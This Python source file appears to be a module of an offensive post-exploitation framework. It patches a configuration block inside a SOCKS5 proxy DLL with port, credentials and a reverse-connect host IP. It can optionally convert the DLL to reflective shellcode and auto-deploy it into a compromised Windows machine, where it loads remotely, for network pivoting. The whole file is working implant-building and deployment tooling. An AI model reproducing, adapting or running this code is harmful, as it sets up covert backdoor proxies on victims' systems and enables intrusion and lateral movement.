import datetime
import eternalhush as eh
from additional.clingyspider import api
from additional.clingyspider import const
from additional import _deploy_socks_host
import os

CONFIG_MAGIC = 0xcafebabecafebabe
CONFIG = {
    "magic_value": eh.LONGLONG,
    "port" : eh.LONG,
    "revsock" : eh.LONG,
    "username" : 65,
    "password" : 65,
    "ip": 16
}

def main(args):
    if args.arch.lower() == "win64":
        dll_name = "X64_proxysrv.dll"
    elif args.arch.lower() == "win32":
        dll_name = "X32_proxysrv.dll"
    else:
        eh.ui.Echo("Unknown arch!", eh.ECHO_ERROR)
        return
    try:
        with open(os.path.join(eh.FILEDIR, dll_name), "rb") as f:
            dll_buf = f.read()
    except Exception as e:
        eh.ui.Echo(str(e), eh.ECHO_ERROR)
        return
    
    if not args.user:
        args.user = 0
    if not args.password:
        args.password = 0

    magic_val = dll_buf.find(CONFIG_MAGIC.to_bytes(eh.LONGLONG, "little"))
    if magic_val > 0:
        config = eh.data.Struct(CONFIG)
        config.from_bytes(dll_buf, global_offset=magic_val)
        
        config.magic_value = 0
        config.port = args.port
        if (not args.user and args.password) or (args.user and not args.password):
            eh.ui.Echo("You need to specify valid username/password", eh.ECHO_ERROR)
            return
        elif args.user and args.password:
            config.username = bytes(args.user[:64],'utf-8') + b"\x00"
            config.password = bytes(args.password[:64], 'utf-8') + b"\x00"
        
        dt = datetime.datetime.now()
        current_time = dt.strftime("%Y_%m_%d_%Hh%Mm%Ss")

        if args.reverse:
            if not args.host:
                eh.ui.Echo("You need to specify valid -host option", eh.ECHO_ERROR)
                return
            if not args.local_port:
                eh.ui.Echo("You need to specify valid -local_port option", eh.ECHO_ERROR)
                return
            config.revsock = 1
            config.ip = args.host
            

            out_path = os.path.join(eh.ui.GetGlobalEnv("OPERATION_PATH"), "storage/proxydll_"+current_time)
            os.mkdir(out_path)
            
            eh.ui.Echo("Patching host proxy dll...", eh.ECHO_DEFAULT)
            _deploy_socks_host.configure_hostdll(args, out_path)
        else:
            config.revsock = 0

        try:
            out_path = os.path.join(eh.ui.GetGlobalEnv("OPERATION_PATH"), "storage/proxydll_"+current_time)
            os.mkdir(out_path)
        except FileExistsError:
            pass

        eh.ui.Echo("Patching srv proxy dll...", eh.ECHO_DEFAULT)
        out_path = os.path.join(out_path, "proxysrv"+dll_name[1:3]+".dll")
        try:
            with open(out_path, "wb+") as f:
                wr_bytes = f.write(config.full_data())
                eh.ui.Echo("Configured proxysrv dll at {}".format(out_path), eh.ECHO_GOOD)
                if args.shellcode:
                    eh.ui.Echo("Generating reflective shellcode...", eh.ECHO_DEFAULT)
                    eh.ui.Run("!gen_scldr -dll {} -arch {} -out {}".format(out_path, "win"+dll_name[1:3], out_path[:-3]+"bin"), eh.RUN_NORMAL)
                    eh.ui.Echo("Configured proxysrv shellcode at {}".format(out_path[:-3]+"bin"), eh.ECHO_GOOD)
        except IOError:
            eh.ui.Echo("Error while opening the file "+ out_path, eh.ECHO_ERROR)
            return
        
        if args.autodeploy:
            proxyhost_dll_path = os.path.join(eh.ui.GetGlobalEnv("OPERATION_PATH"), "storage/proxydll_"+current_time, "proxyhost"+dll_name[1:3]+".dll")
            #if args.shellcode:
            #    proxysrv_sc_path = out_path[:-3]+"bin"
            #    eh.ui.Echo("Autodeploying shellcode...", eh.ECHO_DEFAULT)
            #    eh.ui.Run("!scinject")
            proxysrv_dll_path = os.path.join(eh.ui.GetGlobalEnv("OPERATION_PATH"), "storage/proxydll_"+current_time, "proxysrv"+dll_name[1:3]+".dll")
            eh.ui.Echo("Auto-deploying DLL payload...", eh.ECHO_DEFAULT)
            if not args.reverse:
                eh.ui.Echo("Skipping local part of payload (no '-reverse' flag)", eh.ECHO_DEFAULT)
            else:
                eh.ui.Echo("Setting-up local part of payload...", eh.ECHO_DEFAULT)
                eh.ui.Run(f"!hostprocess -mode dll -bin {proxyhost_dll_path} -arch {args.arch.upper()} -export RemoteCall", eh.RUN_NORMAL)
            eh.ui.Echo("Setting-up remote part of payload...", eh.ECHO_DEFAULT)
            eh.ui.Run(f"!dllload -dll {proxysrv_dll_path} -export RemoteCall -nowait", eh.RUN_NORMAL)
            
            user = args.user
            password = args.password 
            if user == None:
                user = ""
            if password == None:
                password = ""
            
            if args.reverse:
                eh.ui.Echo(f"Try connect to localhost:{args.local_port} (creds {user}:{password}) SOCKS5", eh.ECHO_GOOD)
            else:
                eh.ui.Echo(f"Try connect to <remote_ip>:{args.port} (creds {user}:{password}) SOCKS5", eh.ECHO_GOOD)